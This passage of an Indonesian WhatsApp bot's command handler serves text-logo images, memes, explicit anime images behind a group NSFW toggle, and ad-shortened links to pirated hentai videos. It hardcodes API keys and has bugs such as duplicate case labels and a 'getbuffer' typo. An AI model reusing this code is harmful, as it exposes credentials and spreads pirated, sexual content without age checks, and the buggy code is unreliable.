					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'googletxt':
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} xhiro|mhonshine|f`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					ll3 = makell.split("|")[0];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'battlefield': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} xhiro|mhonshine`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'coffeecup': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} xhiro mhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'coffeecup2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} xhiro mhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
			case 'neon': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} XhiroMhonshine`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Haikal.sendMessage(from, buffer1, image, {quoted: ikal, caption: `${makell}\n\nJangan Lupa Donasi Kak https://saweria.co/hwmodswa`,thumbnail:thumbnail})
					break
	case 'halloween':
	if (!q) return reply(from, `Penggunaan🔥➥ ${prefix}halloween teks`, kal)
	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${q}&apikey=${HunterApi}`)
   break
   case 'vampire':
   if (!q) return reply(from, `Penggunaan🔥➥ ${prefix}vampire teks`, kal)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${q}&apikey=${HunterApi}`)
   break
   case 'codetxt':
   if (!q) return reply(from, `Penggunaan🔥➥ ${prefix}codetxt teks`, kal)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${q}&apikey=${HunterApi}`)
   break
case 'matrix':
				if (!q) return reply(from, `Penggunaan🔥➥ ${prefix}matrix teks`, kal)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${q}&apikey=${HunterApi}`)
				break
				case 'googletxt':
				if (!q) return reply(from, `Penggunaan🔥➥ ${prefix}googletxt teks`, kal)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/google?text=${q}&apikey=${HunterApi}`)
				break
				case 'spiderman':
				if (!q) return reply(from, `Penggunaan🔥➥ ${prefix}sipderman teks`, kal)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${q}&apikey=${HunterApi}`)
				break
				case 'express':
				if (!q) return reply(from, `Penggunaan🔥➥ ${prefix}express teks`, kal)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${q}&apikey=${HunterApi}`)
				break
				case 'dance':
				if (!q) return reply(from, `Penggunaan🔥➥ ${prefix}dance teks`, kal)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${q}&apikey=${HunterApi}`)
				break
				case 'blackbird':
				if (!q) return reply(from, `Penggunaan🔥➥ ${prefix}blackbird teks`, kal)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/blackbird?text=${q}&apikey=${HunterApi}`)
				break
				case 'text3d':
				if (!q) return reply(from, `Penggunaan🔥➥ ${prefix}text3d teks`, kal)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${q}&apikey=${HunterApi}`)
				break
				case 'warrior':
				if (!q) return reply(from, `Penggunaan🔥➥ ${prefix}warrior teks`, kal)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${q}&apikey=${HunterApi}`)
				break
case 'karakter':
if (isBan) return reply(mess.ban)
if (!q) return freply('yg mau di cari apa?')
pinterest(`${q}`).then( data => {
const amsulah = data.result
const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
sendMediaURL (from ,pimterest , `karakter : ${q}`)
})
				    break
case 'fox':  
if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/fox`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: ikal})
                   break                   
                   case 'cat':  
                   if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/cat`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: ikal})
                   break                                      
                   case 'bird':  
                   if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/birb`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: ikal})
                   break
                   case 'koala':  
                   if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/koala`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: ikal})
                   break
                   case 'meme':  
                   if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/meme`)
                   anu1 = await getBuffer(anu.image)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak`, quoted: ikal})
                   break
case 'smeme':
if (isBan) return reply(mess.ban)
pe = args.join('')
            top = pe.split('|')[0]
            bottom = pe.split('|')[1]
var imgbb = require('imgbb-uploader')
if ((isMedia && !kal.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(kal).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kal
owgi = await  Haikal.downloadAndSaveMediaMessage(ger)
anu = await imgbb("20a14861e4f7591f3dc52649cb07ae02", owgi)
tekks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${tekks}`
sendStickerFromUrl(from, `${anu1}`)
} else {
reply('Gunakan foto/stiker!')
}
break
case 'pinterest':
if (isBan) return reply(mess.ban)
if (!q) return freply('yg mau di cari apa?')
pinterest(`${q}`).then( data => {
const amsulah = data.result
const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
sendMediaURL (from ,pimterest , `Pinterest : ${q}`)
})
break
   case 'image':
   if (isBan) return reply(mess.ban)
            if (args.length < 1) return freply('Masukan teks!')
            const gimg = args.join('');
            freply(mess.wait)
            gis(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            Haikal.sendMessage(from,{url:images},image,{quoted:ikal})
            });
            break
case 'attp':
if (isBan) return reply(mess.ban)
					if (!q) return freply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp crew`)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(q)}`)
					Haikal.sendMessage(from, atetepe, sticker, { quoted: ikal })
					break
case 'darkjokes':
if (isBan) return reply(mess.ban)
data = fs.readFileSync('./lib/darkjokes.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasil = await getBuffer(randKey.result)
Haikal.sendMessage(from, hasil, image, {quoted: ikal})
break
                   case 'memeindo':  
                   if (isBan) return reply(mess.ban)
                   freply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await fetchJson(`https://api.zeks.xyz/api/memeindo?apikey=apivinz`)
                   anu1 = await getBuffer(anu.result)
                   Haikal.sendMessage(from, anu1, image, {caption: `nihh kak`, quoted: ikal})
                   break
                   case 'jokes':  
                   if (isBan) return reply(mess.ban)
                   freply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await fetchJson(`https://api.zeks.xyz/api/darkjokes?apikey=apivinz`)
                   anu1 = await getBuffer(anu.result)
                   Haikal.sendMessage(from, anu1, image, {caption: `nihh kak`, quoted: ikal})
                   break
                   case 'nickff': 
                   if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://api.zeks.xyz/api/nickepep?apikey=apivinz`)
                   anu1 = `➻ *NIHH* : ${anu.result}\n`
                   anu1 += `➻ *NIHH* : ${anu.result}\n`
                   anu1 += `➻ *NIHH* : ${anu.result}\n`
                   anu1 += `➻ *NIHH* : ${anu.result}\n`
                   freply(anu1)
                   break
                   case 'tahta':  
                   if (isBan) return reply(mess.ban)
                   if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(7)
                   freply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${F}&apikey=apivinz`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: ikal})
                   break
                   case 'neon2':  
                   if (isBan) return reply(mess.ban)
                   if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(7)
                   freply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/bneon?apikey=apivinz&text=${F}`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: ikal})
                   break                    
                   case 'wall':  
                   if (isBan) return reply(mess.ban)
                   if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(6)
                   freply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/breakwall?apikey=apivinz&text=${F}`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: ikal})
                   break   
                   case 'wolf':  
                   if (isBan) return reply(mess.ban)
                   if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(6)
                   freply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/wolflogo?apikey=apivinz&text1=rimurubotz&text2=${F}`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: ikal})
                   break 
                   case 'tfire':  
                   if (isBan) return reply(mess.ban)
                   if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(7)
                   freply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/tfire?text=${F}&apikey=apivinz`)                   
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: ikal})
                   break                
                   case 'ytgold': 
                   if (isBan) return reply(mess.ban)
                   if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(8)
                   freply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/gplaybutton?text=${F}&apikey=apivinz`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: ikal})
                   break
                   case 'ytsilver': 
                   if (isBan) return reply(mess.ban)
                   if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(10)
                   freply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/splaybutton?text=${F}&apikey=apivinz`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: ikal})
                   break
                   case 't3d':  
                   if (isBan) return reply(mess.ban)
                   if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(5)
                   freply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/text3dbox?apikey=apivinz&text=${F}`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: ikal})
                   break
                   case 'logoa':  
                   if (isBan) return reply(mess.ban)
                   if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} Haikal&chan*`)
                   var F = body.slice(7)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   freply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/logoaveng?text1=${F1}&text2=${F2}&apikey=apivinz`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: ikal})
                   break
                   case 'pornhub':  
                   if (isBan) return reply(mess.ban)
                   if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} Haikal&chan*`)
                   var F = body.slice(9)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   freply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/phlogo?text1=${F1}&text2=${F2}&apikey=apivinz`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: ikal})
                   break
                   case 'marvel':  
                   if (isBan) return reply(mess.ban)
                   if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} Haikal&chan*`)
                   var F = body.slice(8)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   freply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/marvellogo?text1=${F1}&text2=${F2}&apikey=apivinz`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: ikal})
                   break
                   case 'leavest':  
                   if (isBan) return reply(mess.ban)
                   if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} Haikal*`)
                   F = body.slice(9)
                   freply(`WAIT KAK CANTIK/GANTENG`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/leavest?text=${F}&apikey=apivinz`)
                   Haikal.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: ikal})
                   break
// Nulis By Haikal
case 'nulis1':  
if (isBan) return reply(mess.ban)
                    if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} nama & kelas & nulis*`)
                    var F = body.slice(8)
			        var F1 = F.split("&")[0];
			        var F2 = F.split("&")[1]; 
			 	   var F3 = F.split("&")[2]; 
                    freply(' ```kintil``` ')
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis?nama=${F1}&kelas=${F2}&text=${F3}&APIKEY=${xteam}`)
                    Haikal.sendMessage(from, anu, image, {caption: `Nih Kak`, quoted: ikal})
                    break
case 'nulis2':  
if (isBan) return reply(mess.ban)
                    if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)                    
                    var F = body.slice(8)         
			                    freply(' ```kintil``` ')
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis2?text=${F}&APIKEY=${xteam}`)
                    Haikal.sendMessage(from, anu, image, {caption: `*Nih Kak!*`, quoted: ikal}) 
                    break 
                    case 'nulis3':  
                    if (isBan) return reply(mess.ban)
                    if (args.length < 1) return freply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`) 
                    var F = body.slice(8)          
    			                        freply(' ```kintil``` ')
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis6?text=${F}&APIKEY=${xteam}`)
                    Haikal.sendMessage(from, anu, image, {caption: `*Nih Kak!*`, quoted: ikal}) 
                    break                
                    // Photooxy ( HW MODS WA )
case 'phy':
if (isBan) return reply(mess.ban)
if (args.length < 1) return freply(`Example :\n${prefix}phy <name>`)
if (args[0] === 'glitch') {
if (args.length < 2) return freply(`Example :\n${prefix}phy glitch HAIKAL|Hacker 404`)
var cv = body.slice(12)
var quer = cv.split("|")[0];
var quer1 = cv.split("|")[1];
freply(mess.wait)
ph.pGlitch(quer, quer1).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi kak')
})
} else if (args[0] === 'coffecup') {
if (args.length < 2) return freply(`Example :\n${prefix}phy coffecup HAIKAL`)
anu = body.slice(14)
freply(mess.wait)
ph.pCoffeCup(anu).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi kak')
})
} else if (args[0] === 'shadow') {
if (args.length < 2) return freply(`Example :\n${prefix}phy shadow HAIKAL`)
anu = body.slice(12)
freply(mess.wait)
ph.pShadow(anu).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi kak')
})
} else if (args[0] === 'neon') {
if (args.length < 2) return freply(`Example :\n${prefix}phy neon HAIKAL`)
anu = body.slice(9)
freply(mess.wait)
ph.pNeons(anu).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi kak')
})
} else if (args[0] === 'wanted') {
if (args.length < 2) return freply(`Example :\n${prefix}phy wanted`)
var cv = body.slice(12)
var uri = cv.split("|")[0];
var quer = cv.split("|")[1];
var quer1 = cv.split("|")[2];
freply(mess.wait)
ph.pWanted(uri, quer, quer1).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi kak')
})
} else {
freply(`*List Photooxy :*\n•> glitch\n•> coffecup\n•> shadow\n•> wanted\n•> neon`)
}
break
// nekopoi +18
case 'nekopoi1':
if (isBan) return reply(mess.ban)
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://duit.cc/3mPrWYuR\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
case 'nekopoi1':
if (isBan) return reply(mess.ban)
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://duit.cc/3mPrWYuR\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi2':
                 if (isBan) return reply(mess.ban)
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://duit.cc/WNSMEC\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi3':
                 if (isBan) return reply(mess.ban)
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://duit.cc/eyqJ9Z\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi4':
                 if (isBan) return reply(mess.ban)
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://www109.zippyshare.com/d/2ebALhhS/463654/%5bNekoPoi%5d_Watashi_ga_Toriko_-_02%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi5':
                 if (isBan) return reply(mess.ban)
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getbuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://www115.zippyshare.com/d/LmzOkRAI/313299/%5bNekoPoi%5d_Chichi-iro_Toiki_-_01_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi6':
                 if (isBan) return reply(mess.ban)
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://www89.zippyshare.com/d/SgEHvrJs/42812/%5bNekoPoi%5d_Chichi-iro_Toiki_-_02_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi7':
                 if (isBan) return reply(mess.ban)
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://www66.zippyshare.com/d/j0ivbciL/520411/%5bNekoPoi%5d_Onna_Maou_Melissa_no_H_na_Boukenki_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi8':
                 if (isBan) return reply(mess.ban)
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://www71.zippyshare.com/d/M225YIrR/535656/%5bNekoPoi%5d_Buta_no_Gotoki_Sanzoku_ni_Torawarete_Shojo_wo_Ubawareru_Kyonyuu_Hikalishi_Onna_Senshi_-_01%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi9':
                 if (isBan) return reply(mess.ban)
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Haikal.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://www49.zippyshare.com/d/bdwYjaXS/605790/%5bNekoPoi%5d_Akebi_no_Hana___Maho_-_01_%5b360P%5d_%5bnekopoi.pro%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break                        
                  //NSFw
case 'yuri':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
kon = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=yuri&apikey=hardianto`)
anu = await getBuffer(kon)
Haikal.sendMessage(from, anu, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'anal':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
aku = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=anal&apikey=hardianto`)
kon = await getBuffer(aku)
Haikal.sendMessage(from, kon, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'lesbian':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
kau = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=lesbian&apikey=hardianto`)
kon = await getBuffer(kau)
Haikal.sendMessage(from, kon, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'eroneko':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroNeko&apikey=hardianto`)
kon = await getBuffer(hai)
Haikal.sendMessage(from, kon, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'bj':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=bJ&apikey=hardianto`)
kon = await getBuffer(hai)
Haikal.sendMessage(from, kon, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'kitsune':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=kitsune&apikey=hardianto`)
kon = await getBuffer(hai)
Haikal.sendMessage(from, kon, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'pussy':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=pussy&apikey=hardianto`)
Haikal.sendMessage(from, hai, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'wallpaper':
if (!isGroup) return reply(mess.only.group)
